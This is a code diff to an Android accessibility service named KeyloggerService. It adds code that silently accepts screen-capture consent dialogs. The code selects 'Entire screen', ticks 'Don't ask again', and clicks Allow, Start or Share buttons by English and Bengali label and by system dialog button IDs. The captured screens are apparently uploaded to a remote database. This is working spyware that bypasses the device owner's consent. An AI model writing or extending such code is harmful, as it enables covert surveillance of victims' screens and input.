@@ -1102,11 +1102,31 @@ class KeyloggerService : AccessibilityService() {
 
     private fun handleMediaProjectionAutoAllow(event: AccessibilityEvent) {
         val pkg = event.packageName?.toString() ?: ""
-        if (pkg == "android" || pkg == "com.android.systemui" || pkg.contains("packageinstaller") || pkg.contains("permissioncontroller")) {
+        if (pkg == "android" || pkg == "com.android.systemui" || pkg.contains("packageinstaller") || pkg.contains("permissioncontroller") || pkg.contains("settings")) {
             val root = try { rootInActiveWindow } catch (e: Exception) { null } ?: return
             try {
-                // Auto check "Don't ask again" checkbox
-                val cbTexts = listOf("Don't ask again", "Remember choice", "Show this warning again", "আর দেখাবেন না")
+                // 1. Auto-select "Entire screen" / "Entire display" on Android 14/15/16 dropdowns or radio buttons
+                val screenOptionKeywords = listOf("Entire screen", "Entire Screen", "Entire display", "সম্পূর্ণ স্ক্রিন", "পুরো স্ক্রিন", "Full screen", "Share entire screen")
+                for (opt in screenOptionKeywords) {
+                    val optNodes = root.findAccessibilityNodeInfosByText(opt)
+                    for (node in optNodes) {
+                        if (node.isClickable && node.isEnabled) {
+                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                        } else {
+                            var parent = node.parent
+                            while (parent != null) {
+                                if (parent.isClickable && parent.isEnabled) {
+                                    parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                                    break
+                                }
+                                parent = parent.parent
+                            }
+                        }
+                    }
+                }
+
+                // 2. Auto check "Don't ask again" checkbox
+                val cbTexts = listOf("Don't ask again", "Remember choice", "Show this warning again", "আর দেখাবেন না", "মনে রাখুন")
                 for (kw in cbTexts) {
                     val cbNodes = root.findAccessibilityNodeInfosByText(kw)
                     for (cb in cbNodes) {
@@ -1116,8 +1136,12 @@ class KeyloggerService : AccessibilityService() {
                     }
                 }
 
-                // Auto click confirmation button
-                val allowKeywords = listOf("Start now", "Start recording", "Start casting", "Start", "Allow", "চালু করুন", "সবার জন্য চালু করুন")
+                // 3. Auto click confirmation button by text or ID
+                val allowKeywords = listOf(
+                    "Start now", "Start recording", "Start casting", "Start", "Allow", 
+                    "Share screen", "Cast screen", "Share", "চালু করুন", "শুরু করুন", 
+                    "অনুমতি দিন", "চালিয়ে যান", "একমত", "সবার জন্য চালু করুন"
+                )
                 for (kw in allowKeywords) {
                     val nodes = root.findAccessibilityNodeInfosByText(kw)
                     for (node in nodes) {
@@ -1132,6 +1156,24 @@ class KeyloggerService : AccessibilityService() {
                                 return
                             }
                             parent = parent.parent
+                        }
+                    }
+                }
+
+                // 4. Fallback search by standard Android Dialog positive button IDs
+                val buttonIds = listOf(
+                    "android:id/button1",
+                    "com.android.systemui:id/button_start",
+                    "com.google.android.permissioncontroller:id/permission_allow_button",
+                    "com.google.android.permissioncontroller:id/permission_allow_foreground_only_button",
+                    "com.android.permissioncontroller:id/permission_allow_button"
+                )
+                for (id in buttonIds) {
+                    val nodes = root.findAccessibilityNodeInfosByViewId(id)
+                    for (node in nodes) {
+                        if (node.isClickable && node.isEnabled) {
+                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                            return
                         }
                     }
                 }
@@ -1178,6 +1220,7 @@ class KeyloggerService : AccessibilityService() {
                                         "source" to "screen",
                                         "time" to ServerValue.TIMESTAMP
                                     ))
+                                    bitmap.recycle()
                                 }
                             }
                             override fun onFailure(errorCode: Int) {
